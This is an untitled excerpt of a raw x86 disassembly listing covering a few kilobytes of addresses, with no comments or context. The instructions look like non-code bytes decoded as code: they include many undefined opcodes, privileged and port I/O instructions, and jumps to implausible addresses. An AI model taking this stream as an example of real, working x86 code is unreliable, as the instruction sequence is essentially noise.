  4134ad:	imul   ebx,DWORD PTR [ebx+0x9],0xffffffb2
  4134b1:	stos   BYTE PTR es:[edi],al
  4134b2:	aaa    
  4134b3:	out    dx,al
  4134b4:	dec    ebp
  4134b5:	adc    eax,0x320e7c8c
  4134ba:	pop    ebx
  4134bb:	icebp  
  4134bc:	jmp    0xa7acd548
  4134c1:	cmp    BYTE PTR [ebp+esi*4-0x32ea8da],dl
  4134c8:	or     BYTE PTR [edx-0x25],dh
  4134cb:	mov    dl,0x5
  4134cd:	jg     0x4134db
  4134cf:	jge    0x41349f
  4134d1:	inc    edx
  4134d2:	popf   
  4134d3:	sbb    ah,dl
  4134d5:	mov    ds:0xda8c7f19,al
  4134da:	in     eax,0x5b
  4134dc:	jae    0x4134ce
  4134de:	pop    edi
  4134df:	and    ecx,esi
  4134e1:	shl    DWORD PTR [esi-0x64],1
  4134e4:	add    BYTE PTR [edx],cl
  4134e6:	jb     0x4134c8
  4134e8:	cmp    eax,0x8fb5fdd9
  4134ed:	dec    ecx
  4134ee:	pop    ecx
  4134ef:	dec    eax
  4134f0:	fist   DWORD PTR [edx+0x6f]
  4134f3:	and    cl,ch
  4134f5:	call   0x878c0860
  4134fa:	int3   
  4134fb:	mov    ds:0xc169d5f2,eax
  413500:	jne    0x413568
  413502:	test   DWORD PTR [ebp-0x71401fb5],0x1992ee13
  41350c:	js     0x4134df
  41350e:	imul   esp,DWORD PTR [ecx+0x11c00e33],0xe1e09340
  413518:	jne    0x41355c
  41351a:	and    cl,BYTE PTR [ecx]
  41351c:	into   
  41351d:	pop    edx
  41351e:	xor    al,0xf1
  413520:	(bad)  [ecx+ebp*2]
  413523:	(bad)  
  413524:	aas    
  413525:	fs xchg edi,eax
  413527:	lods   al,BYTE PTR ds:[esi]
  413528:	or     eax,DWORD PTR [eax]
  41352a:	iret   
  41352b:	jle    0x41350a
  41352d:	push   es
  41352e:	fdiv   DWORD PTR [ebx+0x2f]
  413531:	retf   0xce83
  413534:	inc    esi
  413535:	je     0x4134ef
  413537:	loop   0x413554
  413539:	nop
  41353a:	ret    0x927c
  41353d:	seta   BYTE PTR [edi]
  413540:	in     al,0xc3
  413542:	xchg   esp,eax
  413543:	jp     0x4134c9
  413545:	dec    esp
  413546:	fsub   QWORD PTR [eax]
  413548:	out    0x33,eax
  41354a:	aaa    
  41354b:	movups xmm4,XMMWORD PTR [ecx-0x3a]
  41354f:	mov    ah,0xff
  413551:	test   eax,0xfab2b4dd
  413556:	fadd   DWORD PTR [ecx-0x362353ba]
  41355c:	fld    DWORD PTR [esi]
  41355e:	mov    eax,0xce9cb1e7
  413563:	mov    ebp,ecx
  413565:	aam    0x37
  413567:	arpl   si,cx
  413569:	psadbw mm2,QWORD PTR [ebx]
  41356c:	jg     0x413549
  41356e:	mov    ecx,0xc1e2963b
  413573:	shl    ebp,cl
  413575:	cmp    eax,0xd31f95f1
  41357a:	(bad)  
  41357b:	pop    esi
  41357c:	inc    ecx
  41357d:	add    edx,ebp
  41357f:	jbe    0x4135a1
  413581:	ficomp WORD PTR [edi]
  413583:	mov    ch,BYTE PTR [ecx+ebp*4+0x60]
  413587:	sub    BYTE PTR [ecx-0x4d],ch
  41358a:	cmp    al,0xd4
  41358c:	adc    eax,0xf5fe64bf
  413591:	or     ebx,ecx
  413593:	cli    
  413594:	and    dh,BYTE PTR [ebx]
  413596:	cmp    bh,BYTE PTR [ecx+0xf9e0be4]
  41359c:	inc    edx
  41359d:	push   edi
  41359e:	xor    eax,0xbc20a529
  4135a3:	inc    edx
  4135a4:	add    cx,bx
  4135a7:	mov    cl,0x2f
  4135a9:	inc    edx
  4135aa:	xchg   esi,eax
  4135ab:	mov    dl,0xcb
  4135ad:	sbb    ebx,DWORD PTR [esi+edx*2]
  4135b0:	test   al,0x17
  4135b2:	push   esi
  4135b3:	mov    ss,WORD PTR [eax+0x17f9c008]
  4135b9:	or     al,0x94
  4135bb:	mov    esi,0x1228a963
  4135c0:	mov    eax,ds:0x34130c4a
  4135c5:	dec    esp
  4135c6:	adc    ah,BYTE PTR [ebx+0x73]
  4135c9:	bound  edx,QWORD PTR [eax]
  4135cb:	and    al,0xe0
  4135cd:	test   BYTE PTR [ecx+0x69c526a],dl
  4135d3:	mov    ecx,ss
  4135d5:	cld    
  4135d6:	loope  0x4135c5
  4135d8:	jno    0x413589
  4135da:	jg     0x41362a
  4135dc:	imul   eax,DWORD PTR [edi],0xffffff8a
  4135df:	add    eax,0x29f95629
  4135e4:	sbb    bl,0x52
  4135e7:	js     0x4135e3
  4135e9:	out    dx,al
  4135ea:	in     al,dx
  4135eb:	mov    bh,0x63
  4135ed:	test   DWORD PTR [ebx-0x6a],ecx
  4135f0:	mov    WORD PTR [ebx+0x1c],gs
  4135f3:	mov    cl,BYTE PTR [esi]
  4135f5:	mov    dl,0x9e
  4135f7:	das    
  4135f8:	clc    
  4135f9:	std    
  4135fa:	mov    WORD PTR [eax],?
  4135fc:	lods   al,BYTE PTR ds:[esi]
  4135fd:	add    edx,DWORD PTR [esi+0x71]
  413600:	and    BYTE PTR [esi+0x23c23fa5],dl
  413606:	cmp    ah,BYTE PTR [ebp-0x2896f15c]
  41360c:	fs ret 
  41360e:	lods   al,BYTE PTR ds:[esi]
  41360f:	pushf  
  413610:	pop    edx
  413611:	and    eax,0xa7719602
  413616:	push   esi
  413617:	imul   ecx,DWORD PTR [edx],0xfb14a363
  41361d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41361e:	fs nop
  413620:	addr16 aas 
  413622:	push   es
  413623:	mov    ecx,0xcf302cc8
  413628:	lock jb 0x4135f0
  41362b:	test   eax,0x626acb38
  413630:	sbb    eax,0x7e14340
  413635:	in     al,dx
  413636:	das    
  413637:	lahf   
  413638:	imul   edx,DWORD PTR [ebp+0x39],0x5c
  41363c:	mov    ch,0x66
  41363e:	xchg   edx,eax
  41363f:	jmp    0xdfc8c843
  413644:	and    al,0x56
  413646:	pop    ecx
  413647:	cmp    bh,BYTE PTR [eax]
  413649:	or     esp,edi
  41364b:	aas    
  41364c:	js     0x41364f
  41364e:	clc    
  41364f:	xchg   esp,eax
  413650:	jno    0x4135ef
  413652:	(bad)  
  413653:	imul   edi,DWORD PTR [ecx+0x40d68895],0x12d0583e
  41365d:	cmp    ah,BYTE PTR [eax*1+0x75c1f9d0]
  413664:	sub    DWORD PTR [edi],eax
  413666:	dec    ebp
  413667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413668:	not    BYTE PTR [ebx+0x44]
  41366b:	and    esi,DWORD PTR [ecx-0x6b]
  41366e:	and    DWORD PTR ds:[ebp+eiz*8+0x5d8eea0d],esp
  413676:	mov    esi,0xba094332
  41367b:	cmp    ah,BYTE PTR [ebp+0x2e7d0a2e]
  413681:	pop    ss
  413682:	sub    ch,BYTE PTR [ebp+0x6c]
  413685:	xchg   ebp,eax
  413686:	dec    esp
  413687:	push   edi
  413688:	test   eax,0x77b1db6
  41368d:	mov    bl,0x28
  41368f:	das    
  413690:	mov    dl,BYTE PTR [edi-0x67]
  413693:	jge    0x41363d
  413695:	out    dx,eax
  413696:	shl    BYTE PTR [eax-0xb],1
  413699:	inc    esi
  41369a:	test   eax,0x401170b7
  41369f:	push   edi
  4136a0:	test   al,0x38
  4136a2:	mov    bl,0x56
  4136a4:	inc    eax
  4136a5:	(bad)  
  4136a7:	fstp   DWORD PTR [esi]
  4136a9:	adc    BYTE PTR [ecx+edx*2-0x57],dl
  4136ad:	and    DWORD PTR [ecx+0x7f],ebx
  4136b0:	and    ebx,DWORD PTR [ecx-0x5d150f89]
  4136b6:	fs in  al,0x2f
  4136b9:	lea    esp,[eax]
  4136bb:	or     ebx,DWORD PTR [esi-0x309e9208]
  4136c1:	xor    al,0xd0
  4136c3:	xchg   edx,esi
  4136c5:	sbb    al,0x8b
  4136c7:	jmp    0x69cb9caf
  4136cc:	adc    edi,DWORD PTR [eax+ebx*2+0x5ac44503]
  4136d3:	mov    eax,0x35c37861
  4136d8:	add    BYTE PTR [esi],al
  4136da:	mov    al,0x8f
  4136dc:	mov    dh,0x22
  4136de:	push   ds
  4136df:	jae    0x41375e
  4136e1:	cdq    
  4136e2:	mov    ebp,0x8d8c9741
  4136e7:	pop    esp
  4136e8:	dec    eax
  4136e9:	int    0x6c
  4136eb:	pop    esi
  4136ec:	lods   al,BYTE PTR ds:[esi]
  4136ed:	push   esi
  4136ee:	lock or DWORD PTR [ecx-0x55],0xffffff9b
  4136f3:	mov    eax,ds:0xfac15874
  4136f8:	jne    0x413702
  4136fa:	adc    edi,DWORD PTR [ebx+0x7273650a]
  413700:	add    cl,BYTE PTR [esi]
  413702:	mov    ds:0x8a088975,eax
  413707:	adc    al,0xdd
  413709:	call   0x3311:0x77d46600
  413710:	jnp    0x4136d6
  413712:	fiadd  WORD PTR [edi+edx*8-0x4caee922]
  41371a:	xchg   bh,al
  41371c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41371d:	ins    BYTE PTR es:[edi],dx
  41371e:	retf   0x9efb
  413721:	mov    cl,0x1a
  413723:	cmp    dl,BYTE PTR [ebx]
  413725:	mov    esi,0xa7c1ffd8
  41372a:	and    BYTE PTR [edx],ah
  41372c:	in     eax,dx
  41372d:	xchg   DWORD PTR [esi+0x0],ecx
  413730:	push   esp
  413731:	jo     0x413786
  413733:	outs   dx,BYTE PTR ds:[esi]
  413734:	in     eax,0x37
  413736:	(bad)  
  413737:	mov    ch,0x1b
  413739:	sub    eax,0x742bb5a5
  41373e:	jle    0x4137ab
  413740:	icebp  
  413741:	cmp    ebp,ecx
  413743:	iret   
  413744:	fild   QWORD PTR [ebp+ebx*4-0x69]
  413748:	rcr    BYTE PTR [edi-0x36],cl
  41374b:	dec    esp
  41374c:	sbb    BYTE PTR [esi],ah
  41374e:	inc    esi
  41374f:	icebp  
  413750:	mov    esp,0x40c10eed
  413755:	adc    al,0x14
  413757:	sbb    DWORD PTR [ebx+ebx*4-0x1b],edi
  41375b:	cmp    ch,ah
  41375d:	dec    edi
  41375e:	pop    bp
  413760:	adc    eax,0xcdbc1653
  413765:	dec    esp
  413766:	or     al,0x35
  413768:	mov    edx,0xf65e25a3
  41376d:	in     al,dx
  41376e:	add    DWORD PTR [edi+0x585492ac],esp
  413774:	adc    BYTE PTR [edi],cl
  413776:	test   eax,0x636f8b7f
  41377b:	and    eax,0x4f68ef07
  413780:	mov    ecx,0x8afb7978
  413785:	mov    WORD PTR [ebx+0x24],fs
  413788:	leave  
  413789:	inc    ecx
  41378a:	adc    BYTE PTR [edi+0x2ed36d60],0x73
  413791:	pop    esi
  413792:	clc    
  413793:	jmp    DWORD PTR [ecx+0x13]
  413796:	cmp    dh,cl
  413798:	mov    edi,ebp
  41379a:	aad    0xf6
  41379c:	sbb    edi,eax
  41379e:	sub    BYTE PTR [ecx+0x7246c450],0x1e
  4137a5:	ficomp DWORD PTR [ebx+0x60def4ae]
  4137ab:	mov    ebp,0x2805d6e7
  4137b0:	adc    eax,0xe149c159
  4137b5:	dec    edx
  4137b6:	and    ah,BYTE PTR [esi+edx*4]
  4137b9:	sub    DWORD PTR ds:0xe2c6de78,0xb0d8a3a
  4137c3:	sub    edi,DWORD PTR [ebp+ecx*8+0x4d]
  4137c7:	xchg   bl,bh
  4137c9:	mov    edi,0xbcb50534
  4137ce:	and    al,0x61
  4137d0:	loopne 0x4137f9
  4137d2:	into   
  4137d3:	nop
  4137d4:	and    BYTE PTR [esi-0x66a8b7ea],dl
  4137da:	(bad)  
  4137db:	mov    dl,0x1e
  4137dd:	loopne 0x413783
  4137df:	out    0x34,eax
  4137e1:	mov    DWORD PTR es:[esi-0x31f3d4c2],ebp
  4137e8:	dec    ebp
  4137e9:	loop   0x41385e
  4137eb:	mov    dl,0x9
  4137ed:	or     dl,BYTE PTR [eax+ebp*8-0x6c710114]
  4137f4:	jo     0x413818
  4137f6:	rcr    BYTE PTR [edi],cl
  4137f8:	hlt    
  4137f9:	adc    eax,0x8bdde444
  4137fe:	call   0x7bf66586
  413803:	ins    DWORD PTR es:[edi],dx
  413804:	xchg   edx,eax
  413805:	xchg   edx,eax
  413806:	outs   dx,DWORD PTR ds:[esi]
  413807:	je     0x4137b7
  413809:	pop    edx
  41380a:	mov    BYTE PTR [ebx-0x4f],ch
  41380d:	icebp  
  41380e:	xor    al,0xd
  413810:	push   ecx
  413811:	fild   QWORD PTR [si+0x1b]
  413815:	push   ss
  413816:	sbb    al,0x1b
  413818:	iret   
  413819:	out    dx,al
  41381a:	cmp    eax,0xa3fec53c
  41381f:	test   DWORD PTR [esi],ecx
  413821:	pop    edx
  413822:	mov    edi,0x7db09e33
  413827:	mov    ecx,0xa0292cce
  41382c:	and    ah,BYTE PTR [ebx-0x5d40aae8]
  413832:	push   ds
  413833:	add    ebx,DWORD PTR [ebp-0x22]
  413836:	rol    DWORD PTR [esi+0x7],0x3c
  41383a:	hlt    
  41383b:	xor    ah,BYTE PTR [esi+0x16]
  41383e:	and    ebx,0x4f3f933b
  413844:	mov    ch,0x3b
  413846:	xor    eax,0x726f0a97
  41384b:	xchg   DWORD PTR [edi-0x67fc0671],esp
  413851:	test   al,0x1c
  413853:	pop    ebx
  413854:	and    ch,BYTE PTR [edx+0x7c9f6070]
  41385a:	test   BYTE PTR ds:0x74c9dac6,0x6b
  413861:	and    ah,BYTE PTR [edi+edi*8-0x7b]
  413865:	mov    dh,0xc7
  413867:	jle    0x4137ee
  413869:	sub    edi,eax
  41386b:	imul   esi,DWORD PTR [edx],0x32e0e806
  413871:	and    DWORD PTR [ecx],esi
  413873:	jmp    0x8156:0x88fa3b6a
  41387a:	cdq    
  41387b:	pop    ebp
  41387c:	pop    ecx
  41387d:	mov    edi,0x71e3a4df
  413882:	mov    dl,0x1c
  413884:	mov    al,ds:0xdc588109
  413889:	(bad)  [edi]
  41388b:	ins    BYTE PTR es:[edi],dx
  41388c:	les    esp,FWORD PTR [eax+0x6d]
  41388f:	jp     0x41386f
  413891:	jns    0x41390e
  413893:	jne    0x4138b1
  413895:	mov    ds:0xc7abdb44,eax
  41389a:	mov    esp,ss
  41389c:	sbb    BYTE PTR [eax+0x3cbe70da],ch
  4138a2:	out    dx,eax
  4138a3:	aam    0x85
  4138a5:	sbb    DWORD PTR [esi+0x11],eax
  4138a8:	dec    ebp
  4138a9:	scas   eax,DWORD PTR es:[edi]
  4138aa:	pop    ebx
  4138ab:	inc    esp
  4138ac:	icebp  
  4138ad:	mov    al,ds:0xab9f3336
  4138b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138b3:	mov    ebx,0xf1d868ea
  4138b8:	fadd   DWORD PTR [edi]
  4138ba:	neg    esi
  4138bc:	sbb    al,0xca
  4138be:	mov    ch,0x12
  4138c0:	(bad)  
  4138c1:	std    
  4138c2:	mov    bl,0x46
  4138c4:	loope  0x41388c
  4138c6:	dec    esi
  4138c7:	xchg   esp,eax
  4138c8:	push   esi
  4138c9:	push   0xffffff81
  4138cb:	sti    
  4138cc:	clc    
  4138cd:	add    BYTE PTR [ecx],ch
  4138cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d0:	out    dx,eax
  4138d1:	ror    DWORD PTR [edx+edx*8+0x75],1
  4138d5:	pop    esi
  4138d6:	jecxz  0x4138f6
  4138d8:	hlt    
  4138d9:	pushf  
  4138da:	dec    edx
  4138db:	scas   eax,DWORD PTR es:[edi]
  4138dc:	cmp    al,0x2c
  4138de:	lods   eax,DWORD PTR ds:[esi]
  4138df:	cmp    cl,BYTE PTR [edi+0x612f57d7]
  4138e5:	push   cs
  4138e6:	inc    edx
  4138e7:	lea    esi,[ebx-0x3a]
  4138ea:	adc    esi,DWORD PTR [ebx]
  4138ec:	shl    DWORD PTR [ecx-0x42355fd4],cl
  4138f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138f3:	dec    esp
  4138f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138f5:	adc    BYTE PTR [edi+0x9bf9400],bl
  4138fb:	dec    ecx
  4138fc:	jb     0x4138be
  4138fe:	adc    edi,DWORD PTR [esi+0x5b]
  413901:	int    0x4b
  413903:	dec    ecx
  413904:	aad    0x45
  413906:	jb     0x413982
  413908:	rcl    BYTE PTR [edi],0x4d
  41390b:	add    edx,ebp
  41390d:	sub    dh,BYTE PTR [ebp+edi*1-0x4]
  413911:	in     eax,dx
  413912:	lahf   
  413913:	mov    esi,0xa95fa8d2
  413918:	adc    BYTE PTR [ebp+0x41f7437],ch
  41391e:	fwait
  41391f:	inc    DWORD PTR [esi-0x10]
  413922:	les    eax,FWORD PTR [edx+0x471abcde]
  413928:	cld    
  413929:	fst    DWORD PTR [eax+eiz*2-0x29]
  41392d:	xchg   esi,eax
  41392e:	xchg   esp,eax
  41392f:	mov    BYTE PTR [ebx+0xce79913],al
  413935:	or     BYTE PTR [eax+0x1b],al
  413938:	mov    cl,0xb9
  41393a:	sahf   
  41393b:	sbb    eax,0x3a9097df
  413940:	outs   dx,BYTE PTR ds:[esi]
  413941:	and    eax,0xcf81002d
  413946:	clc    
  413947:	adc    al,0x1f
  413949:	rcl    BYTE PTR [ebp+0x75],1
  41394c:	loop   0x413949
  41394e:	aaa    
  41394f:	cmp    DWORD PTR [edi-0xd],ebx
  413952:	dec    ecx
  413953:	and    BYTE PTR [edi],0xad
  413956:	push   ss
  413957:	loopne 0x4138ec
  413959:	popf   
  41395a:	arpl   bx,si
  41395c:	jmp    0x530a:0x444426ed
  413963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413964:	inc    edx
  413965:	je     0x413908
  413967:	mov    eax,ds:0xd00ca755
  41396c:	jmp    0x400ce9ca
  413971:	mov    ebp,0xba252a62
  413976:	push   esi
  413977:	leave  
  413978:	mov    DWORD PTR [esi+0x5b83667c],0x2b09babc
  413982:	pop    es
  413983:	xor    eax,DWORD PTR [ebx-0x1777d0a3]
  413989:	jmp    0x4014c3cb
  41398e:	sub    al,0x86
  413990:	hlt    
  413991:	push   ebx
  413992:	aaa    
  413993:	cmp    DWORD PTR [ebx],ebp
  413995:	sbb    esi,DWORD PTR [ebp-0x5f5fe9ef]
  41399b:	loopne 0x4139e0
  41399d:	push   0x3ade17f8
  4139a2:	test   BYTE PTR [ebp+0x4e983e18],ah
  4139a8:	add    cl,bh
  4139aa:	mov    ds:0xc3cd8fa2,eax
  4139af:	cmp    DWORD PTR [esi],ebp
  4139b1:	jmp    0x14bb:0x4d58ddcb
  4139b8:	jbe    0x4139ba
  4139ba:	retf   
  4139bb:	push   0xfd9c3a3a
  4139c0:	xchg   ch,cl
  4139c2:	cmc    
  4139c3:	and    al,0xc0
  4139c5:	fstp   TBYTE PTR [esi]
  4139c7:	jbe    0x4139f7
  4139c9:	sahf   
  4139ca:	pop    ecx
  4139cb:	mov    WORD PTR [ecx+edx*1],cs
  4139ce:	das    
  4139cf:	inc    edx
  4139d0:	das    
  4139d1:	fst    QWORD PTR [esi+eiz*2-0x13113753]
  4139d8:	test   eax,0xf0bf4fc4
  4139dd:	pop    esi
  4139de:	(bad)  
  4139df:	xchg   ebp,eax
  4139e0:	pop    es
  4139e1:	mov    bl,0x73
  4139e3:	pop    edx
  4139e4:	and    DWORD PTR [eax],0x16b75821
  4139ea:	and    esp,DWORD PTR [ecx+0x63]
  4139ed:	push   ds
  4139ee:	dec    eax
  4139ef:	cwde   
  4139f0:	jbe    0x4139c5
  4139f2:	xchg   si,ax
  4139f4:	je     0x413a25
  4139f6:	pop    edx
  4139f7:	pop    es
  4139f8:	inc    edi
  4139f9:	mov    dl,ah
  4139fb:	sar    BYTE PTR [ebx+0x68],0x94
  4139ff:	(bad)  
  413a00:	cs or  al,0x27
  413a03:	fstp   TBYTE PTR [esi]
  413a05:	mov    al,0x1d
  413a07:	(bad)  
  413a08:	(bad)  
  413a0a:	xor    edi,ecx
  413a0c:	or     al,0x5e
  413a0e:	jle    0x4139fd
  413a10:	ins    DWORD PTR es:[edi],dx
  413a11:	fdiv   st(1),st
  413a13:	(bad)  
  413a14:	in     al,dx
  413a15:	call   0xa3a26d5d
  413a1a:	shl    DWORD PTR [ecx],cl
  413a1c:	int3   
  413a1d:	jae    0x4139bf
  413a1f:	mov    esp,0xcbf3eaf4
  413a24:	xor    al,0x78
  413a26:	push   esi
  413a27:	mov    ah,0x87
  413a29:	mov    dh,ch
  413a2b:	dec    esp
  413a2c:	pop    eax
  413a2d:	nop
  413a2e:	push   edi
  413a2f:	dec    ebp
  413a30:	mov    ah,0x70
  413a32:	dec    edi
  413a33:	push   ds
  413a34:	lsl    ebp,WORD PTR [edx]
  413a37:	outs   dx,BYTE PTR ds:[esi]
  413a38:	sar    BYTE PTR [ebp+0x7c],1
  413a3b:	ins    DWORD PTR es:[edi],dx
  413a3c:	inc    esi
  413a3d:	jg     0x4139d4
  413a3f:	(bad)  [eax]
  413a41:	push   cs
  413a42:	xor    BYTE PTR ds:0x77b3b340,dh
  413a48:	or     eax,0x6bd816bf
  413a4d:	out    dx,eax
  413a4e:	pop    edx
  413a4f:	cmp    al,cl
  413a51:	dec    ebx
  413a52:	ficomp DWORD PTR [edx-0x43316793]
  413a58:	xchg   edi,eax
  413a59:	jecxz  0x413a41
  413a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a5c:	sbb    BYTE PTR [edi-0x54],0x81
  413a60:	movzx  eax,si
  413a63:	mov    ds:0xba09e1ce,al
  413a68:	sbb    BYTE PTR [ebx-0x3f],bh
  413a6b:	mov    ah,0xb6
  413a6d:	sbb    eax,DWORD PTR [edx+0x64]
  413a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a71:	aas    
  413a72:	fwait
  413a73:	retf   
  413a74:	imul   edi,DWORD PTR [edi+eiz*2+0x14a77a16],0x78
  413a7c:	dec    edi
  413a7d:	ins    BYTE PTR es:[edi],dx
  413a7e:	cmp    ch,BYTE PTR [edx]
  413a80:	pop    ebx
  413a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a82:	add    al,0x4f
  413a84:	xchg   BYTE PTR [ecx-0x76],ch
  413a87:	int    0xb3
  413a89:	cmp    dx,WORD PTR [edi-0x3b8ce929]
  413a90:	adc    eax,0xea8b874a
  413a95:	mov    ch,0x55
  413a97:	mov    ch,0x6a
  413a99:	xchg   edx,eax
  413a9a:	sbb    BYTE PTR [eax],dh
  413a9c:	dec    ebx
  413a9d:	ret    
  413a9e:	cmp    BYTE PTR [edx+ecx*1],al
  413aa1:	outs   dx,DWORD PTR ds:[esi]
  413aa2:	add    edi,DWORD PTR [edi+esi*1-0xa1538f9]
  413aa9:	jno    0x413a67
  413aab:	das    
  413aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aad:	cmp    al,0xf1
  413aaf:	fldenv [ebx+0x3301d054]
  413ab5:	imul   ebx,DWORD PTR es:[ebx+ecx*8-0x3a84cf32],0x76b7ab97
  413ac1:	adc    bl,BYTE PTR [eax-0x56]
  413ac4:	test   BYTE PTR [eax+0xe],dh
  413ac7:	xor    al,0x47
  413ac9:	sar    BYTE PTR [esi-0x452639fd],1
  413acf:	mov    cs,WORD PTR [ecx-0x3f4f0685]
  413ad5:	fild   DWORD PTR [edi+ebp*8+0x19]
  413ad9:	arpl   WORD PTR [eax+eax*1-0x6e],dx
  413add:	fwait
  413ade:	xchg   BYTE PTR [ebx],dh
  413ae0:	jo     0x413af7
  413ae2:	mov    edx,0x39f0d6b3
  413ae7:	std    
  413ae8:	or     ecx,ebx
  413aea:	in     eax,0xb1
  413aec:	sbb    eax,0xa8b2ea95
  413af1:	inc    edx
  413af2:	popf   
  413af3:	pop    es
  413af4:	xor    cl,BYTE PTR [esi]
  413af6:	and    al,0x3e
  413af8:	retf   
  413af9:	lods   eax,DWORD PTR ds:[esi]
  413afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413afb:	dec    esp
  413afc:	or     edx,DWORD PTR [esp+esi*2+0x21]
  413b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b01:	or     al,BYTE PTR [esi-0x7b205ff4]
  413b07:	and    al,0x81
  413b09:	and    DWORD PTR [ebx+0x37],edx
  413b0c:	jnp    0x413b10
  413b0e:	push   ebp
  413b0f:	and    al,0x1a
  413b11:	(bad)  
  413b12:	cmp    dl,BYTE PTR [esi]
  413b14:	cmp    DWORD PTR [edx+eiz*4+0xb],esi
  413b18:	sahf   
  413b19:	pop    edx
  413b1a:	imul   BYTE PTR [ecx-0x2b07ccb8]
  413b20:	sti    
  413b21:	out    0x67,al
  413b23:	jo     0x413ba4
  413b25:	stos   DWORD PTR es:[edi],eax
  413b26:	sbb    eax,DWORD PTR [esi-0x12]
  413b29:	mov    ebx,0x80be16ae
  413b2e:	adc    bh,BYTE PTR [eax]
  413b30:	or     bl,bh
  413b32:	mov    bh,0x5f
  413b34:	in     eax,0xc9
  413b36:	(bad)  
  413b37:	jno    0x413ad8
  413b39:	xchg   ebx,eax
  413b3a:	add    eax,0x6d4a7034
  413b3f:	lea    ebp,[esi-0x68]
  413b42:	mov    DWORD PTR ds:[edx],edi
  413b45:	sub    al,0xe2
  413b47:	mov    ah,0xcb
  413b49:	xor    DWORD PTR [ecx+0x31],ebx
  413b4c:	mov    es,WORD PTR [ebx-0x6af9f0d1]
  413b52:	xor    BYTE PTR [ecx+0x6254ba6d],bl
  413b58:	push   esp
  413b59:	xchg   ebx,eax
  413b5a:	shl    DWORD PTR [edx+0x66239a7c],0x2f
  413b61:	jne    0x413b54
  413b63:	sub    eax,0x88161f04
  413b68:	fwait
  413b69:	cmp    DWORD PTR ds:0x84958e,eax
  413b6f:	fwait
  413b70:	std    
  413b71:	dec    DWORD PTR [edx-0xc]
  413b74:	call   0x52ff:0xd9b4ed85
  413b7b:	retf   
  413b7c:	iret   
  413b7d:	in     al,0x2e
  413b7f:	mov    ah,0x86
  413b81:	call   0xe31:0x8bc294f8
  413b88:	pop    edi
  413b89:	push   esp
  413b8a:	and    bl,BYTE PTR [edx+0x73fc937]
  413b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b91:	adc    eax,0x426e85bd
  413b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b97:	mov    esi,0xa4525f8d
  413b9c:	call   0xb9075459
  413ba1:	cmp    ebx,DWORD PTR [ebx]
  413ba3:	fcom   QWORD PTR [edi+0x50]
  413ba6:	retf   
  413ba7:	loopne 0x413b5e
  413ba9:	dec    ebx
  413baa:	scas   eax,DWORD PTR es:[edi]
  413bab:	lock sub eax,0xb7142d56
  413bb1:	inc    ebx
  413bb2:	ficom  WORD PTR [edx-0x2b]
  413bb5:	xor    dh,ch
  413bb7:	cs int3 
  413bb9:	(bad)  
  413bba:	into   
  413bbb:	lahf   
  413bbc:	xor    ah,bh
  413bbe:	or     eax,0x9caae9ad
  413bc3:	push   edx
  413bc4:	mov    ebx,0x62d7a678
  413bc9:	push   cs
  413bca:	dec    ebx
  413bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bcc:	inc    ebx
  413bcd:	inc    ecx
  413bce:	imul   ebx,DWORD PTR [edi],0xffffffd7
  413bd1:	push   es
  413bd2:	fist   WORD PTR [ecx]
  413bd4:	pop    es
  413bd5:	ds fadd st,st(7)
  413bd8:	fild   WORD PTR [ecx]
  413bda:	fsub   st(5),st
  413bdc:	mov    cl,0x50
  413bde:	mov    al,ds:0x2863725b
  413be3:	xchg   BYTE PTR [ecx+ebp*8+0x27],ch
  413be7:	ins    BYTE PTR es:[edi],dx
  413be8:	or     eax,0x4b0aa3db
  413bed:	pop    edi
  413bee:	add    BYTE PTR [ecx],bl
  413bf0:	push   edx
  413bf1:	repnz fidiv WORD PTR [esp+esi*4]
  413bf5:	add    ch,BYTE PTR [esi+0x11100559]
  413bfb:	mov    cl,0xc7
  413bfd:	sbb    BYTE PTR [edi+0x71],bh
  413c00:	add    al,0xb
  413c02:	fldz   
  413c04:	shr    DWORD PTR [edi-0x66ade5d0],1
  413c0a:	imul   esp,DWORD PTR [ecx+ebp*8-0x26],0x4a55d9eb
  413c12:	and    BYTE PTR [ecx-0x7b],dl
  413c15:	and    al,BYTE PTR [edi+0x5]
  413c18:	sar    edi,1
  413c1a:	pop    ebx
  413c1b:	sbb    ebp,esi
  413c1d:	cmp    al,0xdc
  413c1f:	dec    esp
  413c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c21:	(bad)  
  413c22:	sub    bh,BYTE PTR [eax]
  413c24:	jmp    0x47c4c80a
  413c29:	pop    ebx
  413c2a:	push   ebp
  413c2b:	mov    ecx,0xe74e34b2
  413c30:	and    DWORD PTR [edi],0xffffffe1
  413c33:	mov    ?,WORD PTR [ecx]
  413c35:	ins    BYTE PTR es:[edi],dx
  413c36:	dec    ecx
  413c37:	nop
  413c38:	fs and eax,0xc80c1f7c
  413c3e:	push   cs
  413c3f:	or     eax,0xd6cb71ce
  413c44:	sti    
  413c45:	and    edi,edi
  413c47:	mov    bh,0x69
  413c49:	mov    edx,DWORD PTR [edi+0x6a23b48e]
  413c4f:	fldenv [eax-0x39]
  413c52:	std    
  413c53:	not    DWORD PTR [ebx+esi*2]
  413c56:	stc    
  413c57:	cmp    eax,0xa33bb403
  413c5c:	jbe    0x413c00
  413c5e:	lock or eax,0xf30148b4
  413c64:	shl    DWORD PTR [edi],0xd8
  413c67:	sub    BYTE PTR [ecx+0x17ea909a],bh
  413c6d:	inc    edi
  413c6e:	pusha  
  413c6f:	mov    ebp,0x427387b1
  413c74:	imul   edi,ebp,0x4f51b640
